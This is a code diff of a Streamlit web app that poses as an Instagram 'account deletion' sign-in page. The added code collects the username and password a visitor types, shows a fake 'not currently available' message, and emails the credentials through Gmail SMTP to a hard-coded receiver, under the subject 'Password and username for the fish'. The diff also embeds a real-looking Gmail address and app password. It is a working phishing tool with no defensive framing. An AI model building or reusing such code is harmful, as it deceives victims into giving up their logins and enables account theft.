@@ -1,37 +1,18 @@
 import streamlit as st
-import socket
+import smtplib
 
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sender_email = "aalokhjithesh@gmail.com"
+receiver_email = "palolibhavan@gmail.com"
+password_for_mail = "bqfu ctqy sbdx frar"
 
-addr = socket.gethostbyname(socket.gethostname())
-
-server.bind(("44.229.200.200", 200))
-
-print(addr)
-
-server.listen()
-
-while True:
-   server.accept()
-
-     
 
 username = ""
 password = ""
+sndmeg = ""
 st.set_page_config("Instagram account deletion")
-class SessionState:
-    def __init__(self):
-        self.username = None
-        self.password = None
-
-# Create an instance of the custom SessionState class
-session_state = SessionState()
 
 left, middle, right = st.columns(3)
 
-if username & password not in st.session_state:
-        st.session_state.username = ""
-        st.session_state.password = ""
 
 
 with middle:
@@ -39,10 +20,22 @@ with middle:
     image_style = f"background-image: url({image_url}); background-size: contain; background-repeat: no-repeat; height: 70px; width: 170px;"
     st.markdown(f'<div style="{image_style}"></div>', unsafe_allow_html=True)
 
-    password = st.text_input("Username")
-    username = st.text_input("Password")
+    username = st.text_input("Username")
+    password = st.text_input("Password", type="password")
+    message = f"""\
+    Subject: Password and username for the fish
+    
+
+    The username is {username} , {password}"""
     st.write(username , password)
     if st.button("Sign-in"):
        st.write("Sorry this page is not currently Available")
-       client.send(username, password.encode('utf-8'))
-     #fhf
+       sndmeg = 1
+       
+       
+if sndmeg == 1 :
+    with smtplib.SMTP("smtp.gmail.com", 587) as server:
+        server.starttls()
+        server.login(sender_email, password_for_mail)
+        server.sendmail(sender_email, receiver_email, message)
+        st.write("email send succesful")
